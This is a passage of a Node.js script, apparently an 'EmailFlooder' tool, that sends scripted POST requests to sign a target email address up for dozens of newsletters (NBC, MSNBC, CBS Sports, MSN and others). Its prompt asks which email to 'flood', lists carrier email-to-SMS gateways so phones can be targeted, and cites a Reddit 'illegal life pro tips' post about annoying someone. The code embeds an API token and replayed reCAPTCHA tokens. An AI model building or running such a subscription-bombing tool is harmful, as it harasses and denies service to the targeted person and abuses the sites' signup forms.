            "body": "surname=AAAAA&givenName=BBBBB&Email=" + email.replace('@', '%40') + "&ConfirmEmail=" + email.replace('@', '%40') + "&languageCode=En&Finance_banking=1&Investment_stock=1&Business_world=1&Int_BNC_Daily_FX=1&Int_BNC_Hebdo_Economique=1&Int_BNC_Hebdo_Energy=1&Courtage_direct=1&Accept_Politique=1&Accept_Infolettre=1&g-recaptcha-response=03AGdBq269E4DK-OLXEG4AyE-dp7JW835RpoVkWwQD8pWyTCt3oxUYf57pNe9qAcYiEUOfRPMZI78hlvTcNwaAb1qwrbuqzcAQ6tTDote8DxG8izH9ojeKLoMGXPfaVHd89gbZNinJyZtdjeinRCyFq0FQO62GmSuy8-CsAEC64NSEHIoxs-4pVDnZElguZ-6pGoPQbd-oq_XO985wpQfTvTKIZVgj96sp0UvzL6ycSy0YVUJaMYJV8B6bCuj25TYwGpnMg5DcmCfoHiKBrjwRQVwMNO23lW9V_UxWscZJpqqYrZoOsZmvEQt0-gJsVJ9YVgtEotE_tc_sCmzQzuZCHHEcAaMeh3os2D_o_WwmcF3talIRGFOeDkudbrQ3WMU3MhBsS5P8p0-CCwQTcy3c5hhdRLgD9oBj_it3k4NcwFPkTcVCLeAQ9BuCpeAdMVHNdlj7V9KftOfZLzMEzFH-N0VOuKAXAxgwPA&confirmer=Confirm&notificationId=368486&templtPurpsCd=NewsLetter&formSourceName=StandardForm&sp_exp=yes",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.contacts.nbc.ca/newsletter/subscription');
    }),
    "nbc15.com": (async email => {
        await fetch("https://api.secondstreetapp.com/form_page_submissions", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-api-key": "65032887",
                "x-organization-id": "327"
            },
            "referrer": "https://www.nbc15.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"form_page_submissions\":[{\"form_id\":994337,\"form_page_id\":1314207,\"design_id\":\"1976901\",\"fields\":[{\"field_id\":39,\"field_value\":\"" + email + "\"}]}]}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbc15.com/newsletter/');
    }),
    "covid19updates": (async email => {
        await fetch("https://confirmsubscription.com/t/t/HostedSubscribeForm/yhhrtly", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://confirmsubscription.com/h/t/6925B3D1925FFCCF",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"fields\":[{\"id\":\"fieldName\",\"type\":\"Text\",\"value\":[\"AAAAA BBBBB\"]},{\"id\":\"fieldEmail\",\"type\":\"Email\",\"value\":[\"" + email + "\"]}],\"referrer\":\"https://www.reddit.com/\",\"reCaptchaResponse\":null}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://confirmsubscription.com/h/t/6925B3D1925FFCCF');
    }),
    "cervical": (async email => {
        await fetch("https://confirmsubscription.com/t/d/HostedSubscribeForm/jrdkkkk", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://confirmsubscription.com/h/d/111B22A75495D78E",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"fields\":[{\"id\":\"fieldName\",\"type\":\"Text\",\"value\":[\"AAAAA BBBBB\"]},{\"id\":\"fieldEmail\",\"type\":\"Email\",\"value\":[\"" + email + "\"]},{\"id\":\"fieldjyykiti\",\"type\":\"MultiSelectOne\",\"value\":[\"5581772\"]}],\"referrer\":\"https://www.reddit.com/\",\"reCaptchaResponse\":null}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://confirmsubscription.com/h/d/111B22A75495D78E');
    }),
    "nbcstuff": (async email => {
        const encodedEmail = email.replace('@', '%40');
        await fetch("https://link.nbcnews.com/join/5cj/the-nightly-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/the-nightly-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_nightlynews%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq25VsPLIhz3eeigcbf9FNIq6y3OMQsq8R9r-Ty-EEi7YAIwFgUPVl35qxYFdN6PdypRTar93vFuTz9kK_2pXY_caoQdWtoAJ_c_EGsn_iVZ25FhUAldXZoVi2CnEClaLJ5PR9Q7_OjOuw8CUR2-NSuYwBCJfZrh7NssuGeZzekQzRXrCrCqTRbypZVRayrJ4Il_bP_58pcYTT62eZ55VnOmUbwlibiDQJXdIjZzbZcvYA6madoNEiJWk07eq-XWCtulJatL6I1EwNLTF71Ol0XdMBhPJavw87q5aSvCj7Xr593BWGp-ILhMlP6gQO2ycxlTgPH_bQ4UfKfcqSF6uwljJnAQEC1XwudPahsSCYZOfklJr4dr8YXj_HlviJSv2fPzgU6eotLHu73t0lg3iw-gCQO1fpnO0VawTGOFLMrDNjGa8bWxvLdxB-kfVnumNfFof8oOX&nonce_60540d51ed443=60540d51ed445&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://link.nbcnews.com/join/5cj/breaking-news-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/breaking-news-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_breaking%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq25CAzbvlIuoc51SOgRoNk509uVCcflJvPObJzTqdlA39zGhm4rp4WrunDHCY6CngJPZJ7qbnBpy5zvg0ebvnLjv6-MToWZ761CopLjkDMEkTZ3Uax0OTyi54vOFAmLL-VcXc5N9Kiy6kO6ODS_pRgJZbAaJ7ADI0kv_RAehclSmXI-LVn_EKAhS5ulpB7iD6gjcp0viobA5QN-0oI_2Bev86Eo1OST0I3xadsHI_Utgd1eXCxX30TExHIQJ0R-7siAb-ZFs-lwSzvCGuyA6LMzfC9pQRToYWvc9IREFEEjXq63Y0HriP2tsR-TmUvD7e9BxplxZe2vS5s2t8Xh6-KMP67TqFGWNEwhHu5rqf8DOmghk1dBhRkGf3KJoAzbsAo3zGirBpVgT0gQz06aFDlrLZeMdGkPMGKkwqjGYtrRlFEjN3uNhP38lyvN1yN1EN3HsqiyZ&nonce_60540d8009aae=60540d8009ab0&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("http://link.nbcnews.com/join/5cj/first-read-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "http://link.nbcnews.com/join/5cj/first-read-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_firstread%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq26_2RmwBEQStU1LHts82LCDCREH_aHMq0JKIQYYX9gPSZMhwzVf4zVotVd7_trlLN24w5ooMibv3ARyl7Wui5TGawpdFdPuDQiViR6bfJEK1IsVBYiHgHZmh40ptd0bZQZad1j5t_Mh8WNIQl2xfQmUjzzvO-bhctGjbQHAj1yYU2aTKAuzrKNmL7jcq3tRxJhKrpaW45r_Ds-Z8pjKlja9HCoxkq98S8c_HqhGFQtgTnp8FCFueealq08Pv1W9heMqY8WZRSchwVJYtV2y7qB2ETPwZ_r5EC5mQ49RZD2I3_f5XIlxRkHUS2sdQq9somX5-_YYCIJmWrA2eBlesNbBrBaSdtWgfq8bPFxJ_LpYnRu8dSu7Ur7NnLd2NRnDoZk8tW1QntfFPDPIGOKOcWN-br5BcTTrn9jIJQE1f7wx9VJjUVWc8_xbBII_H5DG8t_6nsIk&nonce_60540d827d749=60540d827d74b&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://link.nbcnews.com/join/5cj/dateline-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/dateline-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_dateline%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq24k88MHuPoBVdYi1Fww_JCK2-Kj1097fYAdni0tiikTuHvKJYsM745Np25om1n4dayS-ayZn02Jr1KYLxXfOQXvE48SyO2hD2SUSUEWia48KUKjsBZM2rTOG_cKw82UFxZmdhYvkzMGOWJXklWFFDbl1FlTSgdDUvxpz0ZPl7mrv4l5OBX7MgzEXMoZr1r8NvhJQnJFHOZAiVzsEfFQNuAtbogtqP4M47vK7iOJASKYm6hcYwg2XqR28X9uzn7m9oPzPcOaUAFOxeySvk2EcGE5CcYqZGCKexc21lfHZA5BzSp06NkC9VZWp-49qhAk9CvjcooO438_VzzGnrD90_wtn4ssAoohMqT-eqSSIwPSWOwWWbGatWInhe021uE2d7kouPg8JOXg1KfPHU4aDWQKBFD6daI38eJG3ZoK_B38P2h-5onJYhzfeL5110ELPyeStPzq&nonce_60540d8333170=60540d8333172&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://link.nbcnews.com/join/5cj/think-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/think-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_think%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq27zQoMaISZrWWjv5hYWZc-fwmGB8BvtDV2ZE2CyZAdd9WV6gwXjBBF3M5jJdItD5LkHTkGTeWBGYYOPvU0LajrpSkyxAYkyLvFGSkySt_6WIc5GC90B25uREIjhuUMvd7DCQG8hnU08B0JWtREIs3v7TcAFsVsstP8dCDErgIwbBDTFe0RCnVHAk7pz1BO1VLzRgRjNOfGNrVHCuUoZvRnws0814fU8UR-GR6hrlb_pnknC0CV10j4iuDJIpOtJN8fPvijY4etPjc0ybtvgpEDdOhn5VVDEPNmaSMX4474olMYWNj9eRzwU9JkMmPfscbRFHjQjiF_5aEF61r4QCjdXuPs46-plJY3RwhpKQ4OcFiY_FuSyLLsjYXeeNxeiY3gghk3ve5-WC3u5KrQEBJVmFsBEi-UBSylo96HmJ0PLBi1S47iXf0H8JMXsOfzVCF5OMcJt&nonce_60540d842e033=60540d842e035&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://link.nbcnews.com/join/5cj/better-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/better-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_better%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq26GhkHJdOO3WUhDMTHkl4SYFj5-E5dgn8YiYmak6fkR0rStDz9yRSibULtdSeHdvoRkC0HB-r4MWajyxwXGCTPweEGbK2THSyikZH7folvV0RhvvqGeQli2aA_Tvgf9aLblYofKnGvw5lqvkwUE3Sr7TnwkR6MljCS2XIclfal_-g0JsyNO-B7nlabRA_dwbpSVrQs8x0SG9fpoIee8pAhz_iy-kWpGRhUqzpobERGBfZZ2OIhJk5MVU7LSqYlcQVov-cSIrbnBzA0TAA2hN4xwThyXH5Ir2L9U7PizaInGeJDMWmTZu0xHEuGav3OsYcxBQqVbXLLMcDjd1oX6XryIkcO6TFMlZwkUA_e3WqiK6Cju71zf20H_W2-EcYNyOt3oB0FDjQ8rysgEnbqb25E081KdqVDclHgvwFVwsgB7vE0QwOUpxCLbRqWssjOKvfWeGI9Y&nonce_60540d848c148=60540d848c14a&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://link.nbcnews.com/join/5cj/mach-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "https://link.nbcnews.com/join/5cj/mach-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_techscience%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq25fANjBm6qniqooH210-ywUXmDj5W87Z7r3I-Qa_p2Y9VKQ8HLCYaU-8GbGMfMpMCGgQA5M4ju4ewdlBGV5xG6bc_VGpyBhi6wA8bg7LtPU4wAnulHPX9wD42G-cnCD9XbN4GgYO0MJ3NSJa2LnK8B7XKK-PLilFgyZOeHhVZ-hPlZOXmLaKHUoRCTJK7DdGdxp8x115KoTbp55mZbWl7eRKCTQNyj0ExeHFmp_K4v6cqzRVNsLtU38hWbaNFNMXsNIDeXk3j9m4PjkGcCcMbW-GNVTGQ52jRCGFKGq3dDXNnWKeDzFumdTFGFe2eYpjtMawVylDg7DHSkustl7BPJLj4ff8uN3ZJprD5HmMlyFxQJ33t-c-n9DgQUym9-CgI7czh5oq14AfOr-eEnZzmPatEA3YQe8S7l0B5WxyNU3sOrRKQAjKFVkEl7z-z5kxckKC3Wc&nonce_60540d84e784a=60540d84e784b&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        await fetch("http://link.nbcnews.com/join/5cj/byers-market-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "http://link.nbcnews.com/join/5cj/byers-market-signup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + encodedEmail + "&lists%5BMaster%5D=1&vars%5Bsub_byers_brief%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq27wVpt9Yj1D8L26naMxHMyrTSx4ZEiXxBBv_cwGmnBr9uL6W5h4CYwv3irRwK4bJLSf8fLQYegy3KS4XJMCI4Zgg3DlET3LmjSKbhR5h0ND2Xa_pJV2lEIHyQC7t8L02KFzLoSFSTozx6ZiBRUlGr-D5kJ9S_oaJAzQUoCvQnc2DqxdXtaLb0N2peLC2xXbVlDshMvHaihWh0yRpm6JfRXfJLHjJunRFnOX2NwUKHdrowEN0zlQ_rDPSj9escpH-E89PFXtTCa8sUOXnFkg7LrfK6ZW0J218rrjIjR1yCgZukum4WUPTcS92d2oElGrn75ZakFjoCqYnrWulXpsqTVBVlhqjNrbpy1HULTQ_kEkmZ1OknTcv3gZqTcfZ0406UkoBQkkib4g-A1Oy0GqZHNrNwq9zdWnZlk-zTHnjVJ_feVEbGjmEupfpmETLpAMTIb3EYy-&nonce_60540d8633df6=60540d8633df7&profile_id=589b4d1d3c8aa9253d8b4580&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.msnbc.com/newsletters');
    }),
    "nbc26.com": (async email => {
        await fetch("https://api.ewscloud.com/prod/notifications/v1/wgba/contactlists/subscribe/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "Token 09de6f3130469f80b9916b0aa568c6e92587b70a",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site"
            },
            "referrer": "https://www.nbc26.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"contactlist\":[\"8dd3e567-62dc-4aca-bc0c-9650de13aad4\",\"edac06c6-aa98-4904-98db-400d1d5fae99\",\"a08bacd6-657d-422b-a117-0af500a6ea7f\",\"81e98b4e-4158-4760-9031-9c2d9e50b666\",\"edfcc3c0-c337-4498-91e0-5d17690185a1\",\"a53cc146-456f-4b57-b0dd-d10956a79963\"]}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbc26.com/account/manage-email-preferences');
    }),
    "msn.com": (async email => {
        await fetch("https://www.msn.com/en-us/SubscribeUser?topics=MSNToday,BestofMSN,msnusernurturing&email=" + email + "&ver=20210314_19444127", {
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.9",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.msn.com/en-us/newslettersignup",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": null,
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.msn.com/en-us/newslettersignup');
    }),
    "cbssports.com": (async email => {
        const encodedEmail = email.replace('@', '%40');
        await fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/cbs-sports-hq/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23661&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/pick-six/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23664&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-football-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23662&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-baseball-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23663&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
        await fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/the-first-cut/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23584&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.cbssports.com/newsletters/cbs-sports-hq/');
    }),
    "donotpay.com": (async email => {
        await fetch('https://donotpay.com/login?email=' + email.replace('@', '%40'));
        consola.success('Signed up for https://donotpay.com/login?email=');
    })
}

const floodall = async enteredEmail => {
    // Creates NBC Profile
    await fetch("https://www.nbcphiladelphia.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
        "headers": {
            "accept": "application/json, */*;q=0.1",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"
        },
        "referrer": "https://www.nbcphiladelphia.com/newsletters/",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": "{\"email\":\"" + enteredEmail + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{}}",
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });

    let amountOfSites = 0;
    for (const key in sites) {
        amountOfSites++;
        await sites[key](enteredEmail);
    }

    return amountOfSites;
}

const start = async () => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(
        ` * Alltel: phone#@message.alltel.com
 * AT&T: phone#@txt.att.net
 * T-Mobile: phone#@tmomail.net
 * Virgin Mobile: phone#@vmobl.com
 * Sprint: phone#@messaging.sprintpcs.com
 * Verizon: phone#@vtext.com
 * Nextel: phone#@messaging.nextel.com
 * US Cellular: phone#@mms.uscc.net\n`
    );
    rl.question('What email would you like to flood?'.underline + ' ', async enteredEmail => {
        consola.log(`FLOODING!`.bold.yellow + ` ${enteredEmail} was entered`);
        await floodall(enteredEmail);

        console.info('COMPLETE! '.bold.green + 'Press any button to exit.');

        process.stdin.setRawMode(true);
        process.stdin.resume();
        process.stdin.on('data', () => {
            rl.close();
        });
    });
}

console.log('Site Source:'.bold.blue + ' https://www.reddit.com/r/IllegalLifeProTips/comments/m7roq9/ilpt_want_to_annoy_someone_sign_them_up_for_these/');
console.log('Github:'.bold.blue + ' https://github.com/foobball/EmailFlooder');
console.log('\nFor educational purposes only!\n'.blue.bold);

start();

//module.exports = floodall;
